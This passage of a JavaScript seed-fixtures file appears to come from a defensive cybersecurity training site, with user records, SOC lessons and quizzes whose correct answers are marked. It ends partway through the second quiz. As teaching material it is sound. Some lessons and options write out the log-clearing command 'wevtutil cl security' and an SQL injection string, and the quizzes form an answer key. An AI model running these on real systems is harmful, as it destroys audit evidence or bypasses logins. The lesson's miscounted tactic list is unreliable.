/**
 * RedKross Academy — High-Fidelity Initial Seed Fixtures
 * Matches PRD Appendix B (Course Catalogue), Appendix A (State Rules), and Section 8 (Token Economy)
 */

export const INITIAL_USERS = [
  {
    id: 'usr_student_01',
    cadet_id: 'RK-89421',
    email: 'student@redkross.org.in',
    full_name: 'Atharv Sharma',
    avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=256&q=80',
    headline: 'Aspiring SOC Analyst & Blue Team Defender',
    role: 'student',
    created_at: '2026-10-01T08:00:00Z',
    streak_days: 7,
    timezone: 'Asia/Kolkata',
  },
  {
    id: 'usr_admin_01',
    email: 'admin@redkross.org.in',
    full_name: 'Sarah Chen, CISSP',
    avatar: 'https://images.unsplash.com/photo-1580489944761-15a19d654956?auto=format&fit=crop&w=256&q=80',
    headline: 'Director of Defensive Cybersecurity Education',
    role: 'student', // Strict Phase 4.2: NO initial Super Admin user created or seeded
    created_at: '2026-09-01T08:00:00Z',
    streak_days: 34,
    timezone: 'Asia/Kolkata',
  },
  {
    id: 'usr_support_01',
    email: 'support@redkross.org.in',
    full_name: 'David Reynolds',
    avatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=256&q=80',
    headline: 'Academy Operations & Proctoring Specialist',
    role: 'student_support',
    created_at: '2026-09-15T08:00:00Z',
    streak_days: 12,
    timezone: 'Asia/Kolkata',
  }
];

export const INITIAL_LEARNING_PATHS = [
  {
    id: 'path_soc_analyst',
    slug: 'soc-analyst-career-path',
    title: 'Tier-1 to Tier-2 SOC Analyst Career Track',
    short_desc: 'Comprehensive training for 24/7 security operations centres: log analysis, alert triage, SIEM correlation, and rapid defensive response.',
    difficulty: 'Beginner to Intermediate',
    estimated_weeks: 12,
    total_hours: 48,
    courses_count: 4,
    milestone_cert: 'Certified RedKross SOC Specialist (CRSS)',
    featured: true,
    skills: ['SIEM / Splunk / Elastic', 'MITRE ATT&CK', 'Log Triage', 'Packet Inspection', 'Incident Handling'],
    course_ids: ['crs_cyber_fund', 'crs_networking_fund', 'crs_soc_fundamentals', 'crs_incident_response']
  },
  {
    id: 'path_threat_hunter',
    slug: 'threat-hunting-forensics',
    title: 'Threat Hunting & Digital Forensics Specialist',
    short_desc: 'Proactive adversary detection, memory forensics, network packet reassembly, and threat intelligence synthesis.',
    difficulty: 'Intermediate to Advanced',
    estimated_weeks: 14,
    total_hours: 56,
    courses_count: 3,
    milestone_cert: 'Certified Threat Defense Hunter (CTDH)',
    featured: true,
    skills: ['Memory Analysis', 'YARA & Sigma Rules', 'Volatility', 'PCAP Forensics', 'Adversary Emulation'],
    course_ids: ['crs_linux_fund', 'crs_forensics_fund', 'crs_incident_response']
  },
  {
    id: 'path_defensive_engineer',
    slug: 'defensive-security-engineer',
    title: 'Defensive Infrastructure & Cloud Security Architect',
    short_desc: 'Harden enterprise endpoints, configure zero-trust perimeters, and master cloud workload defense in AWS & GCP.',
    difficulty: 'Advanced',
    estimated_weeks: 16,
    total_hours: 64,
    courses_count: 4,
    milestone_cert: 'Certified Defensive Security Architect (CDSA)',
    featured: false,
    skills: ['Cloud IAM', 'Kubernetes Security', 'Hardening', 'Zero Trust Architecture', 'Detection Engineering'],
    course_ids: ['crs_linux_fund', 'crs_web_sec_fund', 'crs_cloud_sec_fund', 'crs_sec_governance']
  }
];

export const INITIAL_COURSES = [
  {
    id: 'crs_soc_fundamentals',
    slug: 'soc-fundamentals-incident-response',
    title: 'SOC Fundamentals & Incident Response',
    version: '1.2',
    category: 'SOC Operations',
    difficulty: 'Intermediate',
    price: 0, // Free to start
    cert_price: 3999, // Paid certificate exam
    estimated_duration: '14 Hours',
    rating: 4.9,
    enrolled_count: 1420,
    card_variant: 'variant-01',
    art: '/assets/course-art/art-01.jpg',
    artPos: '72% 30%',
    estimated_weeks: 8,
    milestone_cert: 'SOC Analyst Certificate',
    skills: ['SIEM', 'Log Analysis', 'Incident Triage', 'Threat Intel'],
    lead_author: {
      name: 'Sarah Chen, CISSP',
      title: 'Principal Incident Handler, RedKross Lab',
      avatar: 'https://images.unsplash.com/photo-1580489944761-15a19d654956?auto=format&fit=crop&w=256&q=80'
    },
    overview: 'Designed for cybersecurity operators and defensive practitioners. This course teaches the practical anatomy of a Security Operations Centre (SOC), modern alert correlation using SIEM, threat hunting workflows, and structured incident containment under the NIST and SANS frameworks.',
    learning_objectives: [
      'Master the 24/7 SOC hierarchy: Tier 1 triage, Tier 2 escalation, and Tier 3 hunting.',
      'Analyze security telemetry across Sysmon, Windows Event Logs, and Linux auditd.',
      'Map observed adversary behavior directly to MITRE ATT&CK techniques.',
      'Formulate rapid containment playbooks for ransomware, phishing, and lateral movement.',
      'Execute defensive remediation without corrupting volatile forensic evidence.'
    ],
    prerequisites: ['Basic understanding of TCP/IP networking', 'Familiarity with command line interfaces'],
    total_tokens_reward: 450,
    modules: [
      {
        id: 'mod_1',
        title: 'Module 1: The Modern Security Operations Centre',
        order: 1,
        lessons: [
          {
            id: 'les_1_1',
            title: '1.1 Architecture & Objectives of Modern SOCs',
            duration: '22 mins',
            is_mandatory: true,
            type: 'text_and_video',
            summary: 'Explore the people, processes, and technology powering 24/7 defensive operations.',
            content: `### 1. The Core Purpose of a Security Operations Centre

A **Security Operations Centre (SOC)** is the command hub responsible for continuous monitoring, identification, analysis, and containment of cybersecurity threats across enterprise endpoints, networks, and cloud workloads.

#### The Triad of Modern Defense
1. **People:** Tier 1 Alert Analysts (Triage), Tier 2 Incident Responders (Investigation), Tier 3 Threat Hunters (Advanced Analysis), and SOC Managers.
2. **Processes:** Standard Operating Procedures (SOPs), Runbooks, Playbooks, and Escalation Thresholds.
3. **Technology:** SIEM (Security Information & Event Management), EDR (Endpoint Detection & Response), SOAR (Security Orchestration, Automation, and Response), and Threat Intelligence Feeds.

\`\`\`bash
# Example: Inspecting an active network connection on a monitored Linux host
ss -tulpn | grep LISTEN
# Check authenticated session history
last -n 5 -F
\`\`\`

> **Core Rule for Defenders:** Speed without precision causes collateral damage. Containment must always preserve volatile evidence (RAM and network sockets) before initiating a system reboot.`,
            resources: [
              { name: 'SOC Tier Structure Cheat Sheet (PDF)', size: '1.2 MB' },
              { name: 'NIST SP 800-61 Rev 2 Incident Handling Guide', size: '2.4 MB' }
            ]
          },
          {
            id: 'les_1_2',
            title: '1.2 Telemetry Ingestion: Logs, NetFlow & Telemetry',
            duration: '28 mins',
            is_mandatory: true,
            type: 'text_and_video',
            summary: 'Understanding telemetry sources: Windows Security Events, Sysmon, syslog, and network flows.',
            content: `### Ingesting & Normalizing Telemetry

Defensive monitoring requires parsing heterogenous log formats into a normalized schema (such as Elastic Common Schema or Splunk CIM).

#### Critical Windows Event IDs for SOC Analysts
- **Event ID 4624:** Successful Account Logon (Look for Logon Type 3 for Network or Type 10 for RDP).
- **Event ID 4625:** Failed Account Logon (Indicates brute force or credential spraying).
- **Event ID 4688:** A new process has been created (Crucial when command line logging is enabled).
- **Sysmon Event ID 1:** Process creation with parent process hashes and command line flags.
- **Sysmon Event ID 3:** Network connection detected on the endpoint.

\`\`\`powershell
# Querying Windows Event Log for suspicious RDP logins (LogonType 10)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} | 
  Where-Object { $_.Properties[8].Value -eq 10 } |
  Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}}, @{N='Source IP';E={$_.Properties[18].Value}}
\`\`\`

Ensure your SIEM pipeline maintains proper indexing and time synchronization (NTP) to preserve strict chronological fidelity across distributed servers.`,
            resources: [
              { name: 'Windows Event ID Triage Card (PDF)', size: '840 KB' }
            ]
          },
          {
            id: 'les_1_3',
            title: '1.3 SIEM Correlation Rules & False Positive Reduction',
            duration: '35 mins',
            is_mandatory: true,
            type: 'text_and_video',
            summary: 'Crafting high-fidelity correlation rules, anomaly thresholds, and alert deduplication.',
            content: `### SIEM Correlation & Alert Fidelity

A high volume of noisy alerts causes **analyst fatigue**, the primary cause of missed breaches in commercial SOCs.

#### The Anatomy of a High-Fidelity Alert
Instead of alerting on single occurrences of failed logins, correlate multiple behavioral signals:
\`\`\`sql
-- Illustrative SIEM Correlation Logic: Brute-force followed by immediate success
SELECT 
    source_ip, 
    target_username,
    COUNT(CASE WHEN event_id = 4625 THEN 1 END) AS failed_attempts,
    COUNT(CASE WHEN event_id = 4624 THEN 1 END) AS successful_logins
FROM security_logs
WHERE timestamp >= NOW() - INTERVAL 10 MINUTE
GROUP BY source_ip, target_username
HAVING failed_attempts >= 5 AND successful_logins >= 1;
\`\`\`

If this rule triggers, the severity is automatically elevated to **High (P2)** because an adversary likely discovered a working password after initial trial.`,
            resources: [
              { name: 'Sigma Rule Authoring Guide', size: '1.5 MB' }
            ]
          }
        ],
        quiz: {
          id: 'quiz_mod_1',
          title: 'Module 1 Evaluation: SOC Fundamentals & Defensive Telemetry',
          passing_score: 80,
          duration_minutes: 20,
          total_questions: 20,
          token_bounty: 150,
          questions: [
            {
              id: 'q_1_1',
              text: 'Which Windows Security Event ID specifically records a successful user account logon?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_1_a', text: 'Event ID 4624', is_correct: true },
                { id: 'opt_1_1_b', text: 'Event ID 4625', is_correct: false },
                { id: 'opt_1_1_c', text: 'Event ID 4688', is_correct: false },
                { id: 'opt_1_1_d', text: 'Event ID 7045', is_correct: false }
              ],
              explanation: 'Windows Event ID 4624 logs successful account logons across console, network, and remote sessions.'
            },
            {
              id: 'q_1_2',
              text: 'In Windows Event 4624, what does Logon Type 10 indicate to a SOC investigator?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_2_a', text: 'Interactive Console Logon (physical console)', is_correct: false },
                { id: 'opt_1_2_b', text: 'Remote Desktop Protocol (RDP / Terminal Services)', is_correct: true },
                { id: 'opt_1_2_c', text: 'Network Share Access (SMB / File Share)', is_correct: false },
                { id: 'opt_1_2_d', text: 'Scheduled Task Execution', is_correct: false }
              ],
              explanation: 'Logon Type 10 specifically designates Remote Interactive sessions established via RDP.'
            },
            {
              id: 'q_1_3',
              text: 'Which SOC architecture layer automates repetitive playbooks such as IP reputation lookups and sandbox detonations?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_3_a', text: 'EDR (Endpoint Detection and Response)', is_correct: false },
                { id: 'opt_1_3_b', text: 'SOAR (Security Orchestration, Automation, and Response)', is_correct: true },
                { id: 'opt_1_3_c', text: 'WAF (Web Application Firewall)', is_correct: false },
                { id: 'opt_1_3_d', text: 'Honeynet Sensor', is_correct: false }
              ],
              explanation: 'SOAR platforms execute codified workflows to enrich indicators and coordinate containment across tools.'
            },
            {
              id: 'q_1_4',
              text: 'Why is capturing volatile memory (RAM) mandatory before powering off a machine suspected of active malware infection?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_4_a', text: 'To avoid damaging physical hard drive sectors', is_correct: false },
                { id: 'opt_1_4_b', text: 'Memory holds transient data like injected DLLs, unencrypted C2 keys, and network sockets', is_correct: true },
                { id: 'opt_1_4_c', text: 'Windows refuses to restart if powered down during an alert', is_correct: false },
                { id: 'opt_1_4_d', text: 'To ensure anti-virus definition updates are not corrupted', is_correct: false }
              ],
              explanation: 'Volatile RAM contains encryption keys, unencrypted process injections, and live network connection sockets that vanish upon power-off.'
            },
            {
              id: 'q_1_5',
              text: 'In Microsoft Sysmon telemetry, which Event ID indicates that a new process was created with full command-line arguments?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_5_a', text: 'Sysmon Event ID 1', is_correct: true },
                { id: 'opt_1_5_b', text: 'Sysmon Event ID 3', is_correct: false },
                { id: 'opt_1_5_c', text: 'Sysmon Event ID 7', is_correct: false },
                { id: 'opt_1_5_d', text: 'Sysmon Event ID 11', is_correct: false }
              ],
              explanation: 'Sysmon Event ID 1 records process creation including parent PID, hashes, user, and command-line arguments.'
            },
            {
              id: 'q_1_6',
              text: 'Which Sysmon Event ID tracks outbound network connections initiated by endpoint binaries?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_6_a', text: 'Sysmon Event ID 2', is_correct: false },
                { id: 'opt_1_6_b', text: 'Sysmon Event ID 3', is_correct: true },
                { id: 'opt_1_6_c', text: 'Sysmon Event ID 8', is_correct: false },
                { id: 'opt_1_6_d', text: 'Sysmon Event ID 13', is_correct: false }
              ],
              explanation: 'Sysmon Event ID 3 logs TCP/UDP network connections initiated from endpoint executables.'
            },
            {
              id: 'q_1_7',
              text: 'Which Windows Event ID signals that a new Windows Service has been installed on an endpoint (common persistence vector)?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_7_a', text: 'System Event ID 7045', is_correct: true },
                { id: 'opt_1_7_b', text: 'Security Event ID 4625', is_correct: false },
                { id: 'opt_1_7_c', text: 'Security Event ID 1102', is_correct: false },
                { id: 'opt_1_7_d', text: 'Application Event ID 1000', is_correct: false }
              ],
              explanation: 'Event ID 7045 in the System log signals the creation of a new Windows service, a frequent persistence technique.'
            },
            {
              id: 'q_1_8',
              text: 'What alert should immediately trigger in a SIEM when Windows Security Event ID 1102 is recorded?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_8_a', text: 'The audit log was cleared by an operator or adversary', is_correct: true },
                { id: 'opt_1_8_b', text: 'A user requested a password reset', is_correct: false },
                { id: 'opt_1_8_c', text: 'A network adapter disconnected', is_correct: false },
                { id: 'opt_1_8_d', text: 'A system crash dump was generated', is_correct: false }
              ],
              explanation: 'Event ID 1102 indicates "The audit log was cleared", which is classified under MITRE ATT&CK Defense Evasion (T1070).'
            },
            {
              id: 'q_1_9',
              text: 'Which metric evaluates the duration between adversary initial compromise and SOC discovery of the breach?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_9_a', text: 'MTTD (Mean Time to Detect) / Dwell Time', is_correct: true },
                { id: 'opt_1_9_b', text: 'MTTR (Mean Time to Respond)', is_correct: false },
                { id: 'opt_1_9_c', text: 'SLA (Service Level Agreement)', is_correct: false },
                { id: 'opt_1_9_d', text: 'RTO (Recovery Time Objective)', is_correct: false }
              ],
              explanation: 'Dwell Time or MTTD measures how long an attacker remains undetected inside the target network.'
            },
            {
              id: 'q_1_10',
              text: 'What traffic characteristic is the primary indicator of DNS Tunneling for C2 communication or data exfiltration?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_10_a', text: 'Abnormally high entropy and length in queried subdomains', is_correct: true },
                { id: 'opt_1_10_b', text: 'DNS queries using port 443 instead of port 53', is_correct: false },
                { id: 'opt_1_10_c', text: 'Constant ICMP echo ping packets to authoritative nameservers', is_correct: false },
                { id: 'opt_1_10_d', text: 'Absence of DNS A records for common websites', is_correct: false }
              ],
              explanation: 'DNS tunneling encodes data into high-entropy, long subdomain strings appended to adversary-controlled domains.'
            },
            {
              id: 'q_1_11',
              text: 'Why do sophisticated Command & Control (C2) agents introduce "Jitter" into their callback beacons?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_11_a', text: 'To encrypt data packets twice using AES-256', is_correct: false },
                { id: 'opt_1_11_b', text: 'To randomize beacon intervals and avoid detection by regular frequency-based SIEM rules', is_correct: true },
                { id: 'opt_1_11_c', text: 'To reduce the CPU utilization on the compromised host', is_correct: false },
                { id: 'opt_1_11_d', text: 'To compress payload size before sending', is_correct: false }
              ],
              explanation: 'Jitter introduces pseudo-random sleep variance (e.g., 60s +/- 20%) to evade automated periodicity detection.'
            },
            {
              id: 'q_1_12',
              text: 'Which Active Directory attack technique involves requesting Kerberos Ticket Granting Service (TGS) tickets for service accounts to crack passwords offline?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_12_a', text: 'Kerberoasting', is_correct: true },
                { id: 'opt_1_12_b', text: 'Pass-the-Hash', is_correct: false },
                { id: 'opt_1_12_c', text: 'DNS Poisoning', is_correct: false },
                { id: 'opt_1_12_d', text: 'ARP Spoofing', is_correct: false }
              ],
              explanation: 'Kerberoasting requests RC4/AES encrypted TGS tickets for Service Principal Names (SPNs) and cracks them offline.'
            },
            {
              id: 'q_1_13',
              text: 'To forge a Golden Ticket in an Active Directory forest, which cryptographic secret must the threat actor compromise?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_13_a', text: 'The KRBTGT account NTLM password hash', is_correct: true },
                { id: 'opt_1_13_b', text: 'The Domain Administrator local SAM database', is_correct: false },
                { id: 'opt_1_13_c', text: 'The DNS zone transfer certificate', is_correct: false },
                { id: 'opt_1_13_d', text: 'The root CA private key only', is_correct: false }
              ],
              explanation: 'A Kerberos Golden Ticket requires the KRBTGT account hash, allowing attackers to forge arbitrary TGTs.'
            },
            {
              id: 'q_1_14',
              text: 'What is the primary role of a YARA rule in a Security Operations Centre triage pipeline?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_14_a', text: 'Pattern matching against malware binary strings, regexes, and byte sequences', is_correct: true },
                { id: 'opt_1_14_b', text: 'Encrypting network packets over an IPsec tunnel', is_correct: false },
                { id: 'opt_1_14_c', text: 'Resolving DNS hostnames to IP addresses', is_correct: false },
                { id: 'opt_1_14_d', text: 'Managing firewall rule sets on Linux iptables', is_correct: false }
              ],
              explanation: 'YARA provides a rule-based approach to detect and classify malware samples based on textual or binary patterns.'
            },
            {
              id: 'q_1_15',
              text: 'According to the NIST SP 800-61r2 Computer Security Incident Handling Guide, what is Phase 1 of the incident lifecycle?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_15_a', text: 'Preparation', is_correct: true },
                { id: 'opt_1_15_b', text: 'Detection & Analysis', is_correct: false },
                { id: 'opt_1_15_c', text: 'Containment, Eradication & Recovery', is_correct: false },
                { id: 'opt_1_15_d', text: 'Post-Incident Activity', is_correct: false }
              ],
              explanation: 'Preparation is the foundational first phase in NIST incident response, establishing tools, policies, and baselines.'
            },
            {
              id: 'q_1_16',
              text: 'What immediate capability does "Host Network Isolation" in modern EDR tools provide during an active breach?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_16_a', text: 'Terminates all communication except encrypted management tunnel to the SOC console', is_correct: true },
                { id: 'opt_1_16_b', text: 'Instantly reformats the infected hard drive partitions', is_correct: false },
                { id: 'opt_1_16_c', text: 'Powers off the system without saving process state', is_correct: false },
                { id: 'opt_1_16_d', text: 'Transfers domain controller rights to a secondary node', is_correct: false }
              ],
              explanation: 'Network isolation cuts off lateral movement and C2 communications while keeping the agent reachable by SOC analysts.'
            },
            {
              id: 'q_1_17',
              text: 'Which open-source framework is the global industry standard for analyzing raw volatile RAM memory dumps (e.g. .raw, .vmem)?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_17_a', text: 'Volatility Framework', is_correct: true },
                { id: 'opt_1_17_b', text: 'Nmap', is_correct: false },
                { id: 'opt_1_17_c', text: 'Burp Suite', is_correct: false },
                { id: 'opt_1_17_d', text: 'Hashcat', is_correct: false }
              ],
              explanation: 'Volatility is the premier open-source memory forensics framework for extracting processes, sockets, and injected code.'
            },
            {
              id: 'q_1_18',
              text: "When triaging an alert generated by a Web Application Firewall (WAF), what does the SQL injection string \' OR 1=1 -- attempt to achieve?",
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_18_a', text: 'Bypass boolean logic to force the query to evaluate to true and dump table records', is_correct: true },
                { id: 'opt_1_18_b', text: 'Crash the web server daemon via buffer overflow', is_correct: false },
                { id: 'opt_1_18_c', text: 'Upload a web shell via multipart form submission', is_correct: false },
                { id: 'opt_1_18_d', text: 'Steal SSL/TLS private session cookies from the client browser', is_correct: false }
              ],
              explanation: 'The payload evaluates condition `1=1` as always TRUE, neutralizing authentication WHERE clauses.'
            },
            {
              id: 'q_1_19',
              text: 'Which MITRE ATT&CK tactic covers techniques that adversaries use to maintain their foothold across system restarts?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_19_a', text: 'Persistence (TA0003)', is_correct: true },
                { id: 'opt_1_19_b', text: 'Reconnaissance (TA0043)', is_correct: false },
                { id: 'opt_1_19_c', text: 'Execution (TA0002)', is_correct: false },
                { id: 'opt_1_19_d', text: 'Exfiltration (TA0010)', is_correct: false }
              ],
              explanation: 'Persistence includes registry run keys, scheduled tasks, and service creation designed to survive reboot.'
            },
            {
              id: 'q_1_20',
              text: 'In incident response triage, what is the best practice for establishing an unbroken "Chain of Custody" for digital evidence?',
              type: 'single_choice',
              points: 5,
              options: [
                { id: 'opt_1_20_a', text: 'Cryptographic hashing (SHA-256) of evidence at acquisition, with detailed custody access logs', is_correct: true },
                { id: 'opt_1_20_b', text: 'Compressing files into a password-protected zip file only', is_correct: false },
                { id: 'opt_1_20_c', text: 'Emailing evidence screenshots directly to the IT director', is_correct: false },
                { id: 'opt_1_20_d', text: 'Renaming the files with chronological date prefixes', is_correct: false }
              ],
              explanation: 'Chain of custody requires mathematical integrity hashes (e.g. SHA-256) and recorded logs of all evidence access.'
            }
          ]
        }
      },
      {
        id: 'mod_2',
        title: 'Module 2: Threat Detection, MITRE ATT&CK & Alert Triage',
        order: 2,
        lessons: [
          {
            id: 'les_2_1',
            title: '2.1 Deconstructing the MITRE ATT&CK Framework',
            duration: '30 mins',
            is_mandatory: true,
            type: 'text_and_video',
            summary: 'Tactics, Techniques, and Sub-techniques: Mapping threat actor tradecraft.',
            content: `### Navigating the MITRE ATT&CK Matrix

The **MITRE ATT&CK** matrix categorizes adversarial behavior into 14 sequential Tactics:
1. Initial Access -> 2. Execution -> 3. Persistence -> 4. Privilege Escalation -> 5. Defense Evasion -> 6. Credential Access -> 7. Discovery -> 8. Lateral Movement -> 9. Collection -> 10. Command and Control -> 11. Exfiltration -> 12. Impact.

#### Identifying Defense Evasion
Defense Evasion (TA0005) includes techniques like:
- **T1070:** Indicator Removal on Host (Clearing Windows Event Logs with \`wevtutil cl security\`).
- **T1036:** Masquerading (Naming a malicious process \`svchost.exe\` inside an abnormal directory like \`C:\\Users\\Public\`).

\`\`\`bash
# Sigma rule excerpt detecting abnormal svchost execution path
selection:
  Image|endswith: '\\svchost.exe'
filter:
  Image|startswith:
    - 'C:\\Windows\\System32\'
    - 'C:\\Windows\\SysWOW64\'
condition: selection and not filter
\`\`\``,
            resources: [
              { name: 'ATT&CK Enterprise Matrix Navigator (JSON)', size: '920 KB' }
            ]
          },
          {
            id: 'les_2_2',
            title: '2.2 Triage Workflows: The 5-Minute Alert Assessment',
            duration: '25 mins',
            is_mandatory: true,
            type: 'text_and_video',
            summary: 'How Tier 1 analysts systematically validate true positives versus benign activity.',
            content: `### The 5-Minute Triage Formula

When an alert triggers, follow this structured triage loop:
1. **Scope:** Which specific asset, user, or IP is implicated?
2. **Context:** Is the activity aligned with normal user business hours and role responsibilities?
3. **Parent-Child Process Heritage:** Did \`winword.exe\` launch \`powershell.exe\`? (Almost always malicious).
4. **Network Destination:** Is the outbound IP flagged on VirusTotal / AbuseIPDB?
5. **Disposition:** Classify as **True Positive (Benign)**, **True Positive (Malicious)**, or **False Positive**.

\`\`\`
Suspicious Process Alert
  │
  ├─ Parent == excel.exe AND Child == cmd.exe ──► P1 Critical Escalation
  │
  └─ Parent == update.exe AND Signed == Microsoft ──► Normal Maintenance (Document & Close)
\`\`\``,
            resources: [
              { name: 'Alert Triage Decision Tree (PDF)', size: '1.1 MB' }
            ]
          }
        ],
        quiz: {
          
          id: 'quiz_mod_2',
          title: 'Module 2 Evaluation: Threat Detection & ATT&CK',
          passing_score: 80,
          duration_minutes: 20,
          total_questions: 20,
          token_bounty: 150,
          questions: [
            {
              id: 'q_2_1',
              text: 'In the MITRE ATT&CK framework, what is the key difference between a "Tactic" and a "Technique"?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_1_a', text: 'A Tactic is the adversary\'s tactical goal (WHY), while a Technique is how they achieve it (HOW)', is_correct: true },
                { id: 'opt_2_1_b', text: 'Tactics are for hardware, Techniques are for software', is_correct: false },
                { id: 'opt_2_1_c', text: 'Tactics are defensive measures, while Techniques are offensive', is_correct: false },
                { id: 'opt_2_1_d', text: 'There is no difference; they are interchangeable', is_correct: false }
              ],
              explanation: 'Tactics represent the adversary\'s technical objective (e.g. Persistence), while Techniques explain the exact method (e.g. Registry Run Keys).'
            },
            {
              id: 'q_2_2',
              text: 'If Microsoft Word (winword.exe) spawns powershell.exe with an encoded base64 argument, what does this strongly indicate?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_2_a', text: 'Normal Microsoft Office automatic template updates', is_correct: false },
                { id: 'opt_2_2_b', text: 'A malicious macro execution or document exploit initiating a payload stage', is_correct: true },
                { id: 'opt_2_2_c', text: 'Windows Defender scanning the document', is_correct: false },
                { id: 'opt_2_2_d', text: 'Network latency during cloud document synchronization', is_correct: false }
              ],
              explanation: 'Office binaries spawning script engines like PowerShell or cmd.exe are classic indicators of weaponized macro documents.'
            },
            {
              id: 'q_2_3',
              text: 'Which command line tool is commonly misused by attackers to clear Windows Event Logs (Technique T1070.001)?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_3_a', text: 'wevtutil cl <logname>', is_correct: true },
                { id: 'opt_2_3_b', text: 'ipconfig /flushdns', is_correct: false },
                { id: 'opt_2_3_c', text: 'netstat -ano', is_correct: false },
                { id: 'opt_2_3_d', text: 'tasklist /v', is_correct: false }
              ],
              explanation: 'wevtutil.exe with the "cl" parameter (clear-log) purges Windows event records to conceal attacker activity.'
            },
            {
              id: 'q_2_4',
              text: 'What does the MITRE ATT&CK technique "Living off the Land" (LotL) refer to?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_4_a', text: 'Using legitimate, pre-installed administrative operating system binaries (LOLBins) to execute actions', is_correct: true },
                { id: 'opt_2_4_b', text: 'Physically breaking into data centers', is_correct: false },
                { id: 'opt_2_4_c', text: 'Deploying open-source ransomware frameworks exclusively', is_correct: false },
                { id: 'opt_2_4_d', text: 'Scanning external IPs using cloud VPS providers', is_correct: false }
              ],
              explanation: 'Living off the Land abuses trusted built-in binaries (like certutil, mshta, powershell) to evade traditional signature detection.'
            },
            {
              id: 'q_2_5',
              text: 'Which Windows Event ID records process creation when Sysmon is deployed?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_5_a', text: 'Sysmon Event ID 1 (Process Create)', is_correct: true },
                { id: 'opt_2_5_b', text: 'Sysmon Event ID 3 (Network Connection)', is_correct: false },
                { id: 'opt_2_5_c', text: 'Sysmon Event ID 7 (Image Loaded)', is_correct: false },
                { id: 'opt_2_5_d', text: 'Sysmon Event ID 13 (Registry Value Set)', is_correct: false }
              ],
              explanation: 'Sysmon Event ID 1 captures detailed process creation including parent process, hashes, and full command line arguments.'
            },
            {
              id: 'q_2_6',
              text: 'What is a "Pass-the-Hash" (PtH) attack according to MITRE ATT&CK T1550.002?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_6_a', text: 'Authenticating to a remote system using an NTLM hash without cracking the plaintext password', is_correct: true },
                { id: 'opt_2_6_b', text: 'Brute-forcing an MD5 hash using hashcat', is_correct: false },
                { id: 'opt_2_6_c', text: 'Intercepting Kerberos tickets over cleartext HTTP', is_correct: false },
                { id: 'opt_2_6_d', text: 'Stealing private SSL certificates from a web server', is_correct: false }
              ],
              explanation: 'In NTLM authentication, the password hash itself acts as the secret equivalent to the plaintext password.'
            },
            {
              id: 'q_2_7',
              text: 'In network threat hunting, what does a sudden surge of outbound DNS queries with high-entropy subdomains typically indicate?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_7_a', text: 'DNS tunneling for Command & Control (C2) or data exfiltration', is_correct: true },
                { id: 'opt_2_7_b', text: 'Standard CDN cache invalidation queries', is_correct: false },
                { id: 'opt_2_7_c', text: 'Router DHCP lease renewals', is_correct: false },
                { id: 'opt_2_7_d', text: 'Normal internal Active Directory SRV lookups', is_correct: false }
              ],
              explanation: 'Adversaries encode data or C2 beacons into randomized subdomains to evade egress firewalls via port 53.'
            },
            {
              id: 'q_2_8',
              text: 'Which MITRE ATT&CK tactic focuses on maintaining an active foothold across reboots?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_8_a', text: 'Persistence (TA0003)', is_correct: true },
                { id: 'opt_2_8_b', text: 'Initial Access (TA0001)', is_correct: false },
                { id: 'opt_2_8_c', text: 'Reconnaissance (TA0043)', is_correct: false },
                { id: 'opt_2_8_d', text: 'Impact (TA0040)', is_correct: false }
              ],
              explanation: 'Persistence consists of techniques adversaries use to keep access to systems across restarts, changed credentials, and interruptions.'
            },
            {
              id: 'q_2_9',
              text: 'What is "Kerberoasting" (MITRE ATT&CK T1558.003)?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_9_a', text: 'Requesting Service Principal Name (SPN) tickets (TGS) and cracking their encrypted service account passwords offline', is_correct: true },
                { id: 'opt_2_9_b', text: 'Flooding the Kerberos KDC server with forged UDP requests', is_correct: false },
                { id: 'opt_2_9_c', text: 'Modifying the Kerberos realm configuration in the Windows Registry', is_correct: false },
                { id: 'opt_2_9_d', text: 'Sniffing plaintext Kerberos credentials over Wi-Fi', is_correct: false }
              ],
              explanation: 'Any authenticated domain user can request a TGS ticket for an SPN, which is encrypted with the service account\'s NTLM hash and cracked offline.'
            },
            {
              id: 'q_2_10',
              text: 'Which EDR telemetry indicator is most characteristic of credential dumping via LSASS?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_10_a', text: 'A non-system process requesting PROCESS_VM_READ access right to lsass.exe', is_correct: true },
                { id: 'opt_2_10_b', text: 'lsass.exe creating a high volume of outbound TCP port 80 connections', is_correct: false },
                { id: 'opt_2_10_c', text: 'High disk writes to the Windows\Temp directory', is_correct: false },
